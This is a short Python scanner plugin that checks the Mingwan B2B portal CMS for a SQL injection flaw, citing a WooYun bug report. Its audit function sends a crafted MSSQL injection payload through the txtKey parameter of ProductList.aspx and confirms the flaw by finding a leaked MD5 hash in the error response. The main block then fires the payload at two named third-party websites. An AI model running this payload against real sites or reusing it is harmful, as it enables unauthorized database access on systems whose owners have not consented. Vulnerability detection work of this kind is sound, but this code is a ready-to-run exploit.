#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:铭万行业门户建站系统存在通用注入漏洞 涉及数十万企业用户 
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0104558

def assign(service,arg):
    if service=="mainone_b2b":
        return True,arg 
    


def  audit(arg):
    url=arg+"Product/ProductList.aspx?type=Category&ID=-1&txtKey=%%27%2BAnd%201=(select%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27)))%20and%2B%27%%27=%27"
    code,head,res,errcode,_=curl.curl2(url)
    if code==500 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_hole(url)
    

if __name__=="__main__":
    from dummy import *
    audit(assign('mainone_b2b','http://www.szyt.com.cn/')[1])
    audit(assign('mainone_b2b','http://www.zwcy.com/')[1])